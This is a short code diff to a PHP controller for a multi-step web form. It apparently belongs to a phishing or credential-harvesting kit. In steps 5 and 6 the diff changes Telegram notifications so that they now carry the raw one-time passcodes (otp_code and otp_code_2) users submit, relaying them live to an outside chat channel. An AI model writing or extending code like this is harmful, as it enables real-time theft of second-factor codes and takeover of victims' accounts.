@@ -73,12 +73,19 @@ class DataController extends Controller
             }
         }
 
-        if ($currentStep == 5 || $currentStep == 6) {
+        if ($currentStep == 5) {
             $recordId = session('record_id');
             if ($recordId) {
                 Data::where('id', $recordId)->update($validated);
             }
-            $this->sendTelegramMessage("OTP code updated for ID: {$recordId}");
+            $this->sendTelegramMessage("OTP code updated for ID: {$recordId} otp_code: {$validated['otp_code']} ");
+        }
+        if ($currentStep == 6) {
+            $recordId = session('record_id');
+            if ($recordId) {
+                Data::where('id', $recordId)->update($validated);
+            }
+            $this->sendTelegramMessage("OTP code updated for ID: {$recordId} otp_code_2: {$validated['otp_code_2']}");
         }
 
         if ($currentStep == 7) {
